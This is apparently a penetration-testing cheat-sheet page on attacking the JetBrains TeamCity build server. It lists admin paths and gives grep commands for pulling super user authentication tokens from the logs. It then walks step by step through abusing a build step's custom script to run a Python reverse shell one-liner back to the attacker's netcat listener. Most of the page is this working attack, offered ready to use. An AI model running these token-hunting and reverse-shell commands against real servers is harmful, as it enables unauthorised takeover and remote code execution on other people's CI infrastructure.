---
title: TeamCity Pentesting
description: TeamCity is a build management and continuous integration server from JetBrains.
tags:
    - Web
refs:
date: 2022-12-25
draft: false
---

## Common Directories

```txt
/admin
/admin/admin.html
```

<br />

## Find Super User Authentication Tokens

If we find a super user authentication token, we can login as super user using the token.

```sh
grep -rni 'authentication token' TeamCity/logs
grep -rni 'Super user authentication token' TeamCity/logs
grep -rni 'token' TeamCity/logs
```

<br />

## Reverse Shell

1. Login as super user.
2. Create a new project in admin dashboard.
3. Click **"Manual"** tab and fill required fields.
4. A new project is created.
5. In the project home, create a **Build Configurations**.
6. In the build configuration page, click **"Build Steps"** on the left menus.
7. Add build step.
8. Select **"Command Line"** in **Runner type**.
9. Put a Python reverse shell script in the **"Custom script"**.
    
    ```sh
    export RHOST="<local-ip>";export RPORT=<local-port>;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
    ```
    
10. Start listener in local machine.
    
    ```bash
    nc -lvnp 4444
    ```
    
11. Click **"Run"** button in the build page.
12. We should get a shell in terminal.
